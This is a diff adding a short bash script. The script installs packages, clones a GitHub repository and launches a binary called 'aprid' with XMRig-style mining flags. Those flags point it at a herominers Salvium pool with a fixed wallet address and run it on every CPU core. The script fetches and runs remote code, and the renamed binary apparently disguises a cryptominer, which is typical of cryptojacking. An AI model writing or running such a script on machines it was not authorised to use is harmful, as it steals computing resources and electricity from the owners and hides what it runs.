@@ -1,0 +1,6 @@
+#!/bin/bash
+yum update && yum -y install sudo
+yum -y install git wget
+git clone https://github.com/nonibihan/luo.git && cd luo
+chmod 777 aprid SHA256SUMS
+./aprid --donate-level 1 -o sg.salvium.herominers.com:1230 -u SaLvsBjB3rLe9v4UXBkesCX2wbDDedKhHSNtSd34raRZ7r6Fji1hLvSRg6sELxHFDre5xvoHhU7Ge1CvG5c4vwzggM2HYfWYhjy -p GASS -a rx/0 -k -t $(nproc --all)
